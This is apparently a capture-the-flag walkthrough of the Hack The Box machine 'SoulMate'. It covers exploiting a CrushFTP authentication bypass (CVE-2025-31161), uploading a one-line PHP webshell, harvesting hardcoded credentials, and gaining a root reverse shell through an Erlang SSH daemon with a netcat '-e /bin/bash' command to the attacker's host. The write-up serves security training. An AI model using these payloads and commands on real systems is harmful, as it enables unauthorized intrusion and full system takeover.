---
categories:
- Hackthebox
image:
  path: soulmate.png
layout: post
media_subpath: /assets/images/soulmate
tags:
- hackthebox
- writeup
- linux
- cve-2025-31161
- crushftp
- authentication-bypass
- erlang
- ssh
- file-upload
- easy
title: HTB - SoulMate Walkthrough
---



## Introduction
SoulMate is an easy-difficulty Linux machine that demonstrates multiple security issues including vulnerable software versions, authentication bypass, and exposed credentials in configuration files. The attack path involves exploiting CVE-2025-31161 in CrushFTP to bypass authentication, gaining access to an administrative panel, resetting user passwords, uploading a webshell, and ultimately leveraging exposed Erlang SSH credentials to achieve root access.
## Reconnaissance
### Port Scanning
Initial `nmap` scan reveals two open ports

```bash
nmap -sCV -oA nmap/Soulmate 10.129.218.10 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-13 11:42 +0300
Nmap scan report for 10.129.218.10
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds

```

**Key Findings:**
- **Port 22**: SSH (OpenSSH 8.9)
- **Port 80**: HTTP (nginx 1.18.0)
- **Hostname**: `soulmate.htb`

Added the domain to the hosts file:

```bash
echo '10.129.218.10  soulmate.htb' | sudo tee -a /etc/hosts
```

## Web Application Enumeration

### SoulMate Website

The main website presents a login and registration page for what appears to be a dating/matching platform.

![test](Pasted image 20250908130532.png)

After registering a user account and logging in, the application offers limited functionality.

![img](Pasted image 20250908130831.png)
### Directory and Subdomain Enumeration

Directory brute-forcing reveals standard PHP endpoints:

```bash
ffuf -u http://soulmate.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -ic -e .php,.txt,.git
<.....SNIP.....>
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1659ms]
login.php               [Status: 200, Size: 8554, Words: 3167, Lines: 178, Duration: 490ms]
register.php            [Status: 200, Size: 11107, Words: 4492, Lines: 238, Duration: 466ms]
profile.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 948ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1164ms]

```

Subdomain enumeration uncovers an interesting host:

```
ffuf -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ic -H 'HOST: FUZZ.soulmate.htb' -fw 4
<......SNIP....>

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 745ms]
<....SNIP...>
```

**Discovery**: `ftp.soulmate.htb` - added to hosts file:

```bash
echo '10.129.218.10  ftp.soulmate.htb' | sudo tee -a /etc/hosts
```

## Initial Access - CrushFTP Authentication Bypass

### CrushFTP Discovery

Visiting `ftp.soulmate.htb` reveals a CrushFTP login page.

![img](Pasted image 20250908131615.png)

Page source indicates version 11.x.x:

![img](Pasted image 20250908131736.png)

### CVE-2025-31161 - Authentication Bypass

**Technical Concept**: CVE-2025-31161 is an authentication bypass vulnerability in CrushFTP versions prior to 11.2.0. The vulnerability allows attackers to create new administrative users without authentication due to improper session validation in the web interface.

Using the public exploit from [Immersive Labs](https://github.com/Immersive-Labs-Sec/CVE-2025-31161):

![img](Pasted image 20250909150824.png)
**Exploitation**:

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user null --password Pass123
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: null
   [*] Password: Pass123.
```

### Administrative Access

Logging in as the newly created user provides access to the CrushFTP administrative interface.

![img](Pasted image 20250909175842.png)

The admin panel reveals extensive functionality, including a **User Manager**:

![img](Pasted image 20250909180029.png)
### User Enumeration and Password Reset

The User Manager displays all system users. Two high-value targets stand out: **ben** and **jenna**.

![img](Pasted image 20250909180305.png)

Resetting ben's password:

![img](Pasted image 20250909181242.png)
### Lateral Movement to Ben

Logging out and back in with ben's new credentials:

![img](Pasted image 20250909181341.png)

## Web Shell Upload

### File Upload Functionality

Ben's account has access to file upload functionality within folders.

![img](Pasted image 20250909181636.png)

**Challenge**: The upload destination was unknown. After testing, files were found to be stored in the web root: `/var/www/html/`

```
cat shell.php 
<?php system($_GET["cmd"]);?>
```
![img](Pasted image 20250909182552.png)

**Verification**: Command execution confirmed.
## Information Gathering

### Database Configuration Discovery

Exploring the filesystem reveals configuration files:

```

cat config.php                                                                                                       
<?php                                                                                                                
class Database {                                                                                                     
    private $db_file = '../data/soulmate.db';                                                                        
    private $pdo;                                                                               public function __construct() {                                                                                  
        $this->connect();                                                                                            
        $this->createTables();                                                                                       
    }                                                                                            
    
    <.....SNIP....>
        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);
        
        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}
```

**Credentials Found**: `admin:Crush4dmin990` (hashed, but the plaintext is visible in the code)

```bash
www-data@soulmate:~/soulmate.htb/config$ ss -tunlp
ss -tunlp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*                                                           
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                                           
tcp   LISTEN 0      5          127.0.0.1:2222       0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:4369       0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:39285      0.0.0.0:*                                                           
tcp   LISTEN 0      128        127.0.0.1:39777      0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:9090       0.0.0.0:*                                                           
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*                                                           
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1217,fd=8),("nginx",pid=1216,fd=8))
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
tcp   LISTEN 0      4096           [::1]:4369          [::]:*                                                           
tcp   LISTEN 0      128             [::]:22            [::]:*                                                           
tcp   LISTEN 0      511             [::]:80            [::]:*    users:(("nginx",pid=1217,fd=9),("nginx",pid=1216,fd=9))
www-data@soulmate:~/soulmate.htb/config$ 
```

Port 4369 is particularly interesting as it's associated with Erlang:

![img](Pasted image 20250909184032.png)
### Erlang SSH Credential Discovery

After researching Erlang configuration locations, a script is found at `/usr/local/lib/erlang_login/`:

```bash
 www-data@soulmate:/usr/local/lib/erlang_login$ ls -la
ls -la
total 16
drwxr-xr-x 2 root root 4096 Aug 15 07:46 .
drwxr-xr-x 5 root root 4096 Aug 14 14:12 ..
-rwxr-xr-x 1 root root 1570 Aug 14 14:12 login.escript
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 start.escript
www-data@soulmate:/usr/local/lib/erlang_login$ 
```

Examining `start.escript` reveals hardcoded credentials:

```bash
ww-data@soulmate:/usr/local/lib/erlang_login$ cat s
cat start.escript 
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

<......SNIP.....>
        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
www-data@soulmate:/usr/local/lib/erlang_login$ 
```

**Critical Finding**: The Erlang SSH daemon on port 2222 authenticates `ben` with password `HouseH0ldings998` - different from the CrushFTP password we set earlier.

## Lateral Movement to Ben (Proper Access)

Using the newly discovered credentials:

```bash
ssh ben@soulmate.htb
The authenticity of host '10.129.129.97 (10.129.129.97)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:52: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.129.97' (ED25519) to the list of known hosts.
ben@10.129.129.97's password: 
Last login: Tue Sep 9 20:01:45 2025 from 10.10.14.62
ben@soulmate:~$ 
```
The user flag can be obtained at `/home/ben/user.txt`

## Privilege Escalation

### Local Service Enumeration

As Ben, we can verify the Erlang SSH service:

```
ben@soulmate:/$ nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
```
Connecting to the Erlang SSH service:

```
ben@soulmate:/$ ssh -p 2222 127.0.0.1
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ED25519) to the list of known hosts.
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

### Erlang Shell Exploitation

**Technical Concept**: Erlang is a functional programming language with built-in support for distributed systems. The Erlang SSH daemon provides an Erlang shell, not a system shell. However, Erlang can execute OS commands through the `os` module.

Exploring available modules:

```
(ssh_runner@soulmate)1> help().
(ssh_runner@soulmate)2> m().
```

The `os` module is available for system command execution.

**Verifying Privileges**:

```
(ssh_runner@soulmate)14> os:cmd("whoami").
"root\n"
(ssh_runner@soulmate)15> 
```

**Success**: The Erlang SSH daemon is running as root.
### Reverse Shell as Root

Setting up a Penelope listener:

```
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.100.153 • 10.10.14.76
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)

(Penelope)> 
(Penelope)> listeners add -i tun0 -p 9001
[+] Listening for reverse shells on 10.10.14.76:9001 
< ...SNIP ....>
```

Executing reverse shell from Erlang:

```
(ssh_runner@soulmate)18> os:cmd("busybox nc 10.10.14.76 9001 -e /bin/bash").
```

**Callback Received**:

```
(Penelope)> listeners add -i tun0 -p 9001
[+] Listening for reverse shells on 10.10.14.76:9001 
[+] Got reverse shell from soulmate~10.129.2.88-Linux-x86_64 😍️ Assigned SessionID <1>
(Penelope)> sessions

➤  soulmate~10.129.2.88-Linux-x86_64

    ID  | Shell | User    | Source                       
    <1> | Raw   | root(0) | TCPListener(10.10.14.76:9001)

(Penelope)> use 1
(Penelope)─(Session [1])> interact
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/d4rkc0de/.penelope/sessions/soulmate~10.129.2.88-Linux-x86_64/2026_02_13-15_20_20-999.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@soulmate:/# 
```

**Root flag**: `/root/root.txt`






